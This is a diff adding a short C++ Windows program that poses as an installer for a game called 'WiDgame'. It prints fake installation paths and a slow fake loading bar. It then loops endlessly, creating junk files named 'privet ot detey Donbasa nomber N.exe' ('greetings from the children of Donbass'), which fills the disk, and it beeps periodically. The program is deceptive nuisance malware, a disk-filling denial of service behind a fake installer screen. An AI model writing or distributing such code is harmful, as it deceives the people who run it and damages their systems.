@@ -1,0 +1,71 @@
+#include <iostream>
+#include <fstream>
+#include <sstream>
+#include <Windows.h>
+
+using namespace std;
+
+stringstream cnt;
+
+string itos(int x)
+{
+	string ans;
+	cnt.clear();
+	cnt << x;
+	cnt >> ans;
+	return ans;
+}
+
+void visualization()
+{
+    Sleep(400);
+	cout << "Starting instalation...\n";
+	cout << "\n";
+	Sleep(800);
+	cout << "Importing files:\n";
+	cout << "C:\\Program Files (x86)\\WiDgame\n";
+	Sleep(700);
+	cout << "C:\\Program Files (x86)\\WiDgame\\libraries\n";
+	Sleep(4000);
+	cout << "C:\\Program Files (x86)\\WiDgame\\elements\n";
+	Sleep(3000);
+	cout << "C:\\Program Files (x86)\\WiDgame\\anime\n";
+	Sleep(2000);
+	cout << "C:\\Program Files (x86)\\WiDgame\\data\n";
+	Sleep(6000);
+	cout << "C:\\Program Files (x86)\\WiDgame\\logs\n";
+	Sleep(4000);
+	cout << "C:\\Program Files (x86)\\WiDgame\\models\n";
+	Sleep(4000);
+	cout << '\n';
+	cout << "Loading:\n";
+	for (int i = 0; i < 100; ++i)
+	{
+		cout << '.';
+		Sleep(1000 * (i % 3 + 3));
+	}
+	Sleep(60 * 1000);
+	cout << "Ending loading\n";
+	Sleep(200);
+	cout << "Please wait little bit\n";
+}
+
+
+int main()
+{
+	string s(100, 'a');
+	visualization();
+	ofstream fout;
+	for (int i = 1; true; ++i)
+	{
+		fout.open("privet ot detey Donbasa nomber" + itos(i) + ".exe");
+		fout << s;
+		fout.close();
+		if (i % 25 == 0 && i > 600)
+		{
+			cout << '\a';
+			Sleep(250);
+		}
+	}
+	return 0;
+}
